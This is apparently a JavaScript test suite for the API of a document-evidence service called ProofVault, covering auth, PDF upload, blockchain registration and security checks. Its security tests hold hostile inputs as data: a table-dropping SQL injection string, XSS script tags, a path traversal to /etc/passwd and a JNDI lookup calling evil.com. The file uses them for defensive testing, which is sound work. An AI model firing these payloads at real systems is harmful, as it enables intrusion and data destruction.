/**
 * API Test Suite
 * 
 * Comprehensive testing of all ProofVault backend API endpoints:
 * - Authentication and authorization flows
 * - Request/response format validation
 * - Error handling and edge cases
 * - Rate limiting and security measures
 * - CORS configuration
 * - API versioning and compatibility
 */

const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

class ApiTestSuite {
  constructor(config) {
    this.config = config;
    this.authToken = null;
    this.testData = {};
    this.apiClient = axios.create({
      baseURL: this.config.apiBaseUrl,
      timeout: 30000
    });
  }

  async setup() {
    console.log('🔧 Setting up API test suite...');
    
    // Setup request/response interceptors for logging
    this.apiClient.interceptors.request.use(request => {
      console.log(`📤 ${request.method.toUpperCase()} ${request.url}`);
      return request;
    });
    
    this.apiClient.interceptors.response.use(
      response => {
        console.log(`📥 ${response.status} ${response.config.method.toUpperCase()} ${response.config.url}`);
        return response;
      },
      error => {
        console.log(`❌ ${error.response?.status || 'ERROR'} ${error.config?.method?.toUpperCase()} ${error.config?.url}`);
        return Promise.reject(error);
      }
    );
    
    // Pre-generate test data
    this.generateTestData();
    
    console.log('✅ API test suite ready');
  }

  async teardown() {
    // Cleanup any test data created during tests
    await this.cleanupTestData();
  }

  generateTestData() {
    const crypto = require('crypto');
    
    this.testData = {
      validHash: crypto.randomBytes(32).toString('hex'),
      invalidHash: 'invalid-hash-format',
      validPDF: this.createTestPDFBuffer(),
      validMetadata: {
        originalUrl: 'https://example.com/test-document',
        title: 'Test Document',
        timestamp: new Date().toISOString(),
        userAgent: 'Test User Agent',
        viewport: { width: 1920, height: 1080 }
      },
      validSignature: 'test-signature-' + Date.now(),
      validUser: {
        username: 'testuser',
        password: 'testpassword',
        email: 'test@example.com'
      }
    };
  }

  createTestPDFBuffer() {
    const pdfContent = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj
xref
0 4
0000000000 65535 f 
0000000010 00000 n 
0000000053 00000 n 
0000000125 00000 n 
trailer
<< /Size 4 /Root 1 0 R >>
startxref
230
%%EOF`;
    return Buffer.from(pdfContent);
  }

  async getTests() {
    return [
      // Health and System Tests
      { name: 'Health Check Endpoint', category: 'system' },
      { name: 'System Information', category: 'system' },
      { name: 'API Version Information', category: 'system' },
      
      // Authentication Tests
      { name: 'User Registration', category: 'auth' },
      { name: 'User Login', category: 'auth' },
      { name: 'JWT Token Validation', category: 'auth' },
      { name: 'Protected Endpoint Access', category: 'auth' },
      { name: 'Token Expiration Handling', category: 'auth' },
      
      // PDF Management Tests
      { name: 'PDF Upload and Processing', category: 'pdf' },
      { name: 'PDF Hash Calculation', category: 'pdf' },
      { name: 'PDF Validation Rules', category: 'pdf' },
      { name: 'PDF Metadata Extraction', category: 'pdf' },
      { name: 'PDF Registration to Blockchain', category: 'pdf' },
      
      // Document Management Tests
      { name: 'Document Creation', category: 'documents' },
      { name: 'Document Retrieval', category: 'documents' },
      { name: 'Document Search', category: 'documents' },
      { name: 'Document Status Updates', category: 'documents' },
      { name: 'Document History Tracking', category: 'documents' },
      
      // Evidence and Verification Tests
      { name: 'Evidence Record Creation', category: 'evidence' },
      { name: 'Evidence Verification', category: 'evidence' },
      { name: 'Hash Lookup and Verification', category: 'evidence' },
      { name: 'Blockchain State Verification', category: 'evidence' },
      
      // Network and Blockchain Tests
      { name: 'Network Status Information', category: 'network' },
      { name: 'Transaction Status Tracking', category: 'network' },
      { name: 'Blockchain Health Monitoring', category: 'network' },
      
      // Extension Integration Tests
      { name: 'Extension Configuration', category: 'extension' },
      { name: 'Extension PDF Submission', category: 'extension' },
      { name: 'Extension CORS Configuration', category: 'extension' },
      
      // Statistics and Analytics Tests
      { name: 'System Statistics', category: 'stats' },
      { name: 'Usage Analytics', category: 'stats' },
      { name: 'Performance Metrics', category: 'stats' },
      
      // Error Handling Tests
      { name: 'Input Validation Errors', category: 'errors' },
      { name: 'Authentication Errors', category: 'errors' },
      { name: 'Rate Limiting', category: 'errors' },
      { name: 'Server Error Handling', category: 'errors' },
      
      // Security Tests
      { name: 'SQL Injection Protection', category: 'security' },
      { name: 'XSS Protection', category: 'security' },
      { name: 'CSRF Protection', category: 'security' },
      { name: 'Input Sanitization', category: 'security' }
    ];
  }

  async runTest(test) {
    console.log(`🧪 Running API test: ${test.name}`);
    
    switch (test.category) {
      case 'system':
        return await this.runSystemTest(test.name);
      case 'auth':
        return await this.runAuthTest(test.name);
      case 'pdf':
        return await this.runPDFTest(test.name);
      case 'documents':
        return await this.runDocumentTest(test.name);
      case 'evidence':
        return await this.runEvidenceTest(test.name);
      case 'network':
        return await this.runNetworkTest(test.name);
      case 'extension':
        return await this.runExtensionTest(test.name);
      case 'stats':
        return await this.runStatsTest(test.name);
      case 'errors':
        return await this.runErrorTest(test.name);
      case 'security':
        return await this.runSecurityTest(test.name);
      default:
        throw new Error(`Unknown test category: ${test.category}`);
    }
  }

  // System Tests
  async runSystemTest(testName) {
    switch (testName) {
      case 'Health Check Endpoint':
        return await this.testHealthCheck();
      case 'System Information':
        return await this.testSystemInfo();
      case 'API Version Information':
        return await this.testApiVersion();
      default:
        throw new Error(`Unknown system test: ${testName}`);
    }
  }

  async testHealthCheck() {
    const response = await this.apiClient.get('/api/health');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['status', 'timestamp', 'services']);
    this.assertEqual(response.data.status, 'healthy');
    
    // Verify service health details
    const services = response.data.services;
    this.assertHasKeys(services, ['database', 'metagraph', 'websocket']);
    
    return { health: response.data };
  }

  async testSystemInfo() {
    const response = await this.apiClient.get('/api/system/info');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['version', 'environment', 'uptime', 'nodeInfo']);
    
    return { systemInfo: response.data };
  }

  async testApiVersion() {
    const response = await this.apiClient.get('/api/version');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['version', 'apiVersion', 'buildDate']);
    this.assertTrue(response.data.version.match(/^\d+\.\d+\.\d+$/));
    
    return { version: response.data };
  }

  // Authentication Tests
  async runAuthTest(testName) {
    switch (testName) {
      case 'User Registration':
        return await this.testUserRegistration();
      case 'User Login':
        return await this.testUserLogin();
      case 'JWT Token Validation':
        return await this.testJWTValidation();
      case 'Protected Endpoint Access':
        return await this.testProtectedEndpoint();
      case 'Token Expiration Handling':
        return await this.testTokenExpiration();
      default:
        throw new Error(`Unknown auth test: ${testName}`);
    }
  }

  async testUserRegistration() {
    const userData = {
      ...this.testData.validUser,
      username: 'testuser_' + Date.now(),
      email: `test_${Date.now()}@example.com`
    };
    
    const response = await this.apiClient.post('/api/auth/register', userData);
    
    this.assertStatus(response, 201);
    this.assertHasKeys(response.data, ['user', 'token']);
    this.assertEqual(response.data.user.username, userData.username);
    
    return { user: response.data.user };
  }

  async testUserLogin() {
    // First create a user
    const userData = {
      ...this.testData.validUser,
      username: 'logintest_' + Date.now(),
      email: `logintest_${Date.now()}@example.com`
    };
    
    await this.apiClient.post('/api/auth/register', userData);
    
    // Then login
    const loginResponse = await this.apiClient.post('/api/auth/login', {
      username: userData.username,
      password: userData.password
    });
    
    this.assertStatus(loginResponse, 200);
    this.assertHasKeys(loginResponse.data, ['token', 'user']);
    
    // Store token for other tests
    this.authToken = loginResponse.data.token;
    
    return { token: loginResponse.data.token };
  }

  async testJWTValidation() {
    if (!this.authToken) {
      await this.testUserLogin();
    }
    
    const response = await this.apiClient.get('/api/auth/validate', {
      headers: { Authorization: `Bearer ${this.authToken}` }
    });
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['valid', 'user']);
    this.assertTrue(response.data.valid);
    
    return { validation: response.data };
  }

  async testProtectedEndpoint() {
    // Test without token (should fail)
    try {
      await this.apiClient.get('/api/users/profile');
      throw new Error('Should have failed without token');
    } catch (error) {
      this.assertStatus(error.response, 401);
    }
    
    // Test with token (should succeed)
    if (!this.authToken) {
      await this.testUserLogin();
    }
    
    const response = await this.apiClient.get('/api/users/profile', {
      headers: { Authorization: `Bearer ${this.authToken}` }
    });
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['id', 'username', 'email']);
    
    return { profile: response.data };
  }

  async testTokenExpiration() {
    // Create an expired token
    const expiredToken = jwt.sign(
      { userId: 'test', username: 'test' },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '-1h' }
    );
    
    try {
      await this.apiClient.get('/api/users/profile', {
        headers: { Authorization: `Bearer ${expiredToken}` }
      });
      throw new Error('Should have failed with expired token');
    } catch (error) {
      this.assertStatus(error.response, 401);
      this.assertTrue(error.response.data.error.includes('expired'));
    }
    
    return { expiredTokenRejected: true };
  }

  // PDF Tests
  async runPDFTest(testName) {
    switch (testName) {
      case 'PDF Upload and Processing':
        return await this.testPDFUpload();
      case 'PDF Hash Calculation':
        return await this.testPDFHash();
      case 'PDF Validation Rules':
        return await this.testPDFValidation();
      case 'PDF Metadata Extraction':
        return await this.testPDFMetadata();
      case 'PDF Registration to Blockchain':
        return await this.testPDFRegistration();
      default:
        throw new Error(`Unknown PDF test: ${testName}`);
    }
  }

  async testPDFUpload() {
    const formData = new FormData();
    formData.append('pdf', this.testData.validPDF, 'test.pdf');
    formData.append('metadata', JSON.stringify(this.testData.validMetadata));
    
    const response = await this.apiClient.post('/api/pdf/upload', formData, {
      headers: formData.getHeaders()
    });
    
    this.assertStatus(response, 201);
    this.assertHasKeys(response.data, ['documentId', 'hash', 'status']);
    this.assertTrue(response.data.hash.match(/^[a-f0-9]{64}$/));
    
    return { upload: response.data };
  }

  async testPDFHash() {
    const response = await this.apiClient.post('/api/pdf/calculate-hash', {
      content: this.testData.validPDF.toString('base64')
    });
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['hash', 'algorithm']);
    this.assertEqual(response.data.algorithm, 'SHA-256');
    this.assertTrue(response.data.hash.match(/^[a-f0-9]{64}$/));
    
    return { hash: response.data };
  }

  async testPDFValidation() {
    // Test valid PDF
    const validResponse = await this.apiClient.post('/api/pdf/validate', {
      content: this.testData.validPDF.toString('base64'),
      mimeType: 'application/pdf',
      size: this.testData.validPDF.length
    });
    
    this.assertStatus(validResponse, 200);
    this.assertTrue(validResponse.data.isValid);
    
    // Test invalid PDF (too large)
    try {
      await this.apiClient.post('/api/pdf/validate', {
        content: 'invalid-content',
        mimeType: 'application/pdf',
        size: 50 * 1024 * 1024 // 50MB
      });
      throw new Error('Should have failed validation');
    } catch (error) {
      this.assertStatus(error.response, 400);
    }
    
    return { validation: validResponse.data };
  }

  async testPDFMetadata() {
    const response = await this.apiClient.post('/api/pdf/extract-metadata', {
      content: this.testData.validPDF.toString('base64')
    });
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['pages', 'size', 'created']);
    
    return { metadata: response.data };
  }

  async testPDFRegistration() {
    const response = await this.apiClient.post('/api/pdf/register', {
      hash: this.testData.validHash,
      metadata: this.testData.validMetadata,
      signature: this.testData.validSignature
    });
    
    this.assertStatus(response, 202);
    this.assertHasKeys(response.data, ['transactionId', 'status']);
    
    return { registration: response.data };
  }

  // Document Tests
  async runDocumentTest(testName) {
    switch (testName) {
      case 'Document Creation':
        return await this.testDocumentCreation();
      case 'Document Retrieval':
        return await this.testDocumentRetrieval();
      case 'Document Search':
        return await this.testDocumentSearch();
      case 'Document Status Updates':
        return await this.testDocumentStatusUpdates();
      case 'Document History Tracking':
        return await this.testDocumentHistory();
      default:
        throw new Error(`Unknown document test: ${testName}`);
    }
  }

  async testDocumentCreation() {
    const documentData = {
      hash: this.testData.validHash,
      originalUrl: this.testData.validMetadata.originalUrl,
      documentTitle: this.testData.validMetadata.title,
      metadata: this.testData.validMetadata
    };
    
    const response = await this.apiClient.post('/api/documents', documentData);
    
    this.assertStatus(response, 201);
    this.assertHasKeys(response.data, ['id', 'hash', 'status', 'createdAt']);
    
    // Store for other tests
    this.testData.documentId = response.data.id;
    
    return { document: response.data };
  }

  async testDocumentRetrieval() {
    if (!this.testData.documentId) {
      await this.testDocumentCreation();
    }
    
    const response = await this.apiClient.get(`/api/documents/${this.testData.documentId}`);
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['id', 'hash', 'originalUrl', 'status']);
    this.assertEqual(response.data.hash, this.testData.validHash);
    
    return { document: response.data };
  }

  async testDocumentSearch() {
    const response = await this.apiClient.get('/api/documents/search', {
      params: { hash: this.testData.validHash }
    });
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['results', 'total', 'page']);
    this.assertTrue(response.data.results.length >= 0);
    
    return { search: response.data };
  }

  async testDocumentStatusUpdates() {
    if (!this.testData.documentId) {
      await this.testDocumentCreation();
    }
    
    const response = await this.apiClient.get(`/api/documents/${this.testData.documentId}/status`);
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['status', 'lastUpdated', 'progress']);
    
    return { status: response.data };
  }

  async testDocumentHistory() {
    if (!this.testData.documentId) {
      await this.testDocumentCreation();
    }
    
    const response = await this.apiClient.get(`/api/documents/${this.testData.documentId}/history`);
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['events']);
    this.assertTrue(Array.isArray(response.data.events));
    
    return { history: response.data };
  }

  // Evidence Tests
  async runEvidenceTest(testName) {
    switch (testName) {
      case 'Evidence Record Creation':
        return await this.testEvidenceCreation();
      case 'Evidence Verification':
        return await this.testEvidenceVerification();
      case 'Hash Lookup and Verification':
        return await this.testHashLookup();
      case 'Blockchain State Verification':
        return await this.testBlockchainStateVerification();
      default:
        throw new Error(`Unknown evidence test: ${testName}`);
    }
  }

  async testEvidenceCreation() {
    const evidenceData = {
      hash: this.testData.validHash,
      originalUrl: this.testData.validMetadata.originalUrl,
      captureTimestamp: this.testData.validMetadata.timestamp,
      metadata: this.testData.validMetadata
    };
    
    const response = await this.apiClient.post('/api/evidence', evidenceData);
    
    this.assertStatus(response, 201);
    this.assertHasKeys(response.data, ['id', 'hash', 'status']);
    
    return { evidence: response.data };
  }

  async testEvidenceVerification() {
    const response = await this.apiClient.get(`/api/evidence/${this.testData.validHash}/verify`);
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['isValid', 'status', 'blockchainRecord']);
    
    return { verification: response.data };
  }

  async testHashLookup() {
    const response = await this.apiClient.get(`/api/evidence/${this.testData.validHash}`);
    
    // Should return 200 if found, 404 if not found
    this.assertTrue(response.status === 200 || response.status === 404);
    
    if (response.status === 200) {
      this.assertHasKeys(response.data, ['hash', 'status', 'createdAt']);
    }
    
    return { lookup: response.data };
  }

  async testBlockchainStateVerification() {
    const response = await this.apiClient.get(`/api/evidence/${this.testData.validHash}/blockchain-state`);
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['onBlockchain', 'transactionId', 'confirmations']);
    
    return { blockchainState: response.data };
  }

  // Network Tests
  async runNetworkTest(testName) {
    switch (testName) {
      case 'Network Status Information':
        return await this.testNetworkStatus();
      case 'Transaction Status Tracking':
        return await this.testTransactionStatus();
      case 'Blockchain Health Monitoring':
        return await this.testBlockchainHealth();
      default:
        throw new Error(`Unknown network test: ${testName}`);
    }
  }

  async testNetworkStatus() {
    const response = await this.apiClient.get('/api/network/status');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['networkId', 'consensusNodes', 'lastSnapshot']);
    
    return { networkStatus: response.data };
  }

  async testTransactionStatus() {
    // This would need a valid transaction ID
    const testTxId = 'test-transaction-id';
    
    try {
      const response = await this.apiClient.get(`/api/transactions/${testTxId}`);
      this.assertHasKeys(response.data, ['status', 'hash', 'blockHeight']);
    } catch (error) {
      // 404 is acceptable for non-existent transaction
      this.assertTrue(error.response.status === 404);
    }
    
    return { transactionStatus: 'tested' };
  }

  async testBlockchainHealth() {
    const response = await this.apiClient.get('/api/network/health');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['metagraph', 'globalL0', 'status']);
    
    return { blockchainHealth: response.data };
  }

  // Extension Tests
  async runExtensionTest(testName) {
    switch (testName) {
      case 'Extension Configuration':
        return await this.testExtensionConfig();
      case 'Extension PDF Submission':
        return await this.testExtensionSubmission();
      case 'Extension CORS Configuration':
        return await this.testExtensionCORS();
      default:
        throw new Error(`Unknown extension test: ${testName}`);
    }
  }

  async testExtensionConfig() {
    const response = await this.apiClient.get('/api/extension/config', {
      headers: {
        'X-Extension-ID': 'test-extension-id',
        'X-Extension-Version': '1.0.0'
      }
    });
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['metagraphUrl', 'maxFileSize', 'supportedFormats']);
    
    return { config: response.data };
  }

  async testExtensionSubmission() {
    const formData = new FormData();
    formData.append('pdf', this.testData.validPDF, 'test.pdf');
    formData.append('metadata', JSON.stringify(this.testData.validMetadata));
    formData.append('signature', this.testData.validSignature);
    
    const response = await this.apiClient.post('/api/extension/submit', formData, {
      headers: {
        ...formData.getHeaders(),
        'X-Extension-ID': 'test-extension-id',
        'X-Extension-Version': '1.0.0'
      }
    });
    
    this.assertStatus(response, 201);
    this.assertHasKeys(response.data, ['documentId', 'hash', 'status']);
    
    return { submission: response.data };
  }

  async testExtensionCORS() {
    const response = await this.apiClient.options('/api/extension/submit');
    
    this.assertStatus(response, 200);
    this.assertTrue(response.headers['access-control-allow-origin'] !== undefined);
    this.assertTrue(response.headers['access-control-allow-methods'] !== undefined);
    
    return { corsHeaders: response.headers };
  }

  // Statistics Tests
  async runStatsTest(testName) {
    switch (testName) {
      case 'System Statistics':
        return await this.testSystemStats();
      case 'Usage Analytics':
        return await this.testUsageAnalytics();
      case 'Performance Metrics':
        return await this.testPerformanceMetrics();
      default:
        throw new Error(`Unknown stats test: ${testName}`);
    }
  }

  async testSystemStats() {
    const response = await this.apiClient.get('/api/stats/system');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['totalDocuments', 'totalVerifications', 'systemUptime']);
    
    return { systemStats: response.data };
  }

  async testUsageAnalytics() {
    const response = await this.apiClient.get('/api/stats/usage');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['dailySubmissions', 'weeklyTrends', 'topUrls']);
    
    return { usageAnalytics: response.data };
  }

  async testPerformanceMetrics() {
    const response = await this.apiClient.get('/api/stats/performance');
    
    this.assertStatus(response, 200);
    this.assertHasKeys(response.data, ['averageProcessingTime', 'successRate', 'errorRates']);
    
    return { performanceMetrics: response.data };
  }

  // Error Handling Tests
  async runErrorTest(testName) {
    switch (testName) {
      case 'Input Validation Errors':
        return await this.testInputValidation();
      case 'Authentication Errors':
        return await this.testAuthErrors();
      case 'Rate Limiting':
        return await this.testRateLimiting();
      case 'Server Error Handling':
        return await this.testServerErrors();
      default:
        throw new Error(`Unknown error test: ${testName}`);
    }
  }

  async testInputValidation() {
    // Test missing required fields
    try {
      await this.apiClient.post('/api/documents', {});
      throw new Error('Should have failed validation');
    } catch (error) {
      this.assertStatus(error.response, 400);
      this.assertTrue(error.response.data.error.includes('validation'));
    }
    
    // Test invalid hash format
    try {
      await this.apiClient.post('/api/documents', {
        hash: 'invalid-hash',
        originalUrl: 'https://example.com'
      });
      throw new Error('Should have failed validation');
    } catch (error) {
      this.assertStatus(error.response, 400);
    }
    
    return { inputValidationWorking: true };
  }

  async testAuthErrors() {
    // Test invalid credentials
    try {
      await this.apiClient.post('/api/auth/login', {
        username: 'nonexistent',
        password: 'wrongpassword'
      });
      throw new Error('Should have failed login');
    } catch (error) {
      this.assertStatus(error.response, 401);
    }
    
    // Test invalid token
    try {
      await this.apiClient.get('/api/users/profile', {
        headers: { Authorization: 'Bearer invalid-token' }
      });
      throw new Error('Should have failed with invalid token');
    } catch (error) {
      this.assertStatus(error.response, 401);
    }
    
    return { authErrorsWorking: true };
  }

  async testRateLimiting() {
    // Make multiple rapid requests to trigger rate limiting
    const requests = Array.from({ length: 100 }, () => 
      this.apiClient.get('/api/health').catch(err => err)
    );
    
    const results = await Promise.all(requests);
    const rateLimitedRequests = results.filter(result => 
      result.response?.status === 429
    );
    
    // Should have some rate limited requests
    this.assertTrue(rateLimitedRequests.length > 0);
    
    return { rateLimitingWorking: true };
  }

  async testServerErrors() {
    // Test handling of non-existent endpoints
    try {
      await this.apiClient.get('/api/nonexistent-endpoint');
      throw new Error('Should have returned 404');
    } catch (error) {
      this.assertStatus(error.response, 404);
    }
    
    return { serverErrorHandling: true };
  }

  // Security Tests
  async runSecurityTest(testName) {
    switch (testName) {
      case 'SQL Injection Protection':
        return await this.testSQLInjection();
      case 'XSS Protection':
        return await this.testXSSProtection();
      case 'CSRF Protection':
        return await this.testCSRFProtection();
      case 'Input Sanitization':
        return await this.testInputSanitization();
      default:
        throw new Error(`Unknown security test: ${testName}`);
    }
  }

  async testSQLInjection() {
    // Attempt SQL injection in search endpoint
    const maliciousInput = "'; DROP TABLE evidence_records; --";
    
    try {
      const response = await this.apiClient.get('/api/documents/search', {
        params: { q: maliciousInput }
      });
      // Should not crash or expose SQL errors
      this.assertTrue(response.status < 500);
    } catch (error) {
      // Should handle gracefully
      this.assertTrue(error.response.status < 500);
    }
    
    return { sqlInjectionProtected: true };
  }

  async testXSSProtection() {
    const xssPayload = '<script>alert("xss")</script>';
    
    try {
      const response = await this.apiClient.post('/api/documents', {
        hash: this.testData.validHash,
        originalUrl: 'https://example.com',
        documentTitle: xssPayload
      });
      
      // Response should not contain unescaped script tags
      this.assertFalse(JSON.stringify(response.data).includes('<script>'));
    } catch (error) {
      // Validation should catch this
      this.assertTrue(error.response.status === 400);
    }
    
    return { xssProtectionWorking: true };
  }

  async testCSRFProtection() {
    // Test that state-changing operations require proper headers
    try {
      // This should be blocked without proper CSRF token
      await axios.post(`${this.config.apiBaseUrl}/api/documents`, {
        hash: this.testData.validHash,
        originalUrl: 'https://example.com'
      }, {
        headers: {
          'Origin': 'https://malicious-site.com'
        }
      });
    } catch (error) {
      // Should be blocked or require additional verification
      this.assertTrue(error.response.status >= 400);
    }
    
    return { csrfProtectionWorking: true };
  }

  async testInputSanitization() {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'javascript:alert(1)'
    ];
    
    for (const input of maliciousInputs) {
      try {
        await this.apiClient.post('/api/documents', {
          hash: this.testData.validHash,
          originalUrl: input,
          documentTitle: input
        });
      } catch (error) {
        // Should be handled gracefully
        this.assertTrue(error.response.status < 500);
      }
    }
    
    return { inputSanitizationWorking: true };
  }

  // Helper methods
  async cleanupTestData() {
    // Clean up any test data created during the tests
    if (this.testData.documentId) {
      try {
        await this.apiClient.delete(`/api/documents/${this.testData.documentId}`);
      } catch (error) {
        // Ignore cleanup errors
      }
    }
  }

  // Assertion methods
  assertStatus(response, expectedStatus) {
    if (response.status !== expectedStatus) {
      throw new Error(`Expected status ${expectedStatus}, got ${response.status}`);
    }
  }

  assertHasKeys(obj, keys) {
    for (const key of keys) {
      if (!(key in obj)) {
        throw new Error(`Missing key: ${key}`);
      }
    }
  }

  assertEqual(actual, expected) {
    if (actual !== expected) {
      throw new Error(`Expected ${expected}, got ${actual}`);
    }
  }

  assertTrue(condition) {
    if (!condition) {
      throw new Error('Expected condition to be true');
    }
  }

  assertFalse(condition) {
    if (condition) {
      throw new Error('Expected condition to be false');
    }
  }
}

module.exports = ApiTestSuite;